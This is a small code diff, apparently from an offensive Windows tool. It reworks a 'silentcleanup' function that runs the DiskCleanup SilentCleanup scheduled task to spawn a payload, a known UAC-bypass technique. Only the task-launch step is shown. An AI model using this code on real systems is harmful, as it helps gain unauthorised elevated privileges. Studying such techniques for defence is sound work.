@@ -33,7 +33,7 @@ def silentcleanup(payload):
 		print_info("Disabling file system redirection")
 		with disable_fsr():
 			print_success("Successfully disabled file system redirection")
-			if process().create("schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I", 1):
+			if process().create("schtasks.exe", params="/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"):
 				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
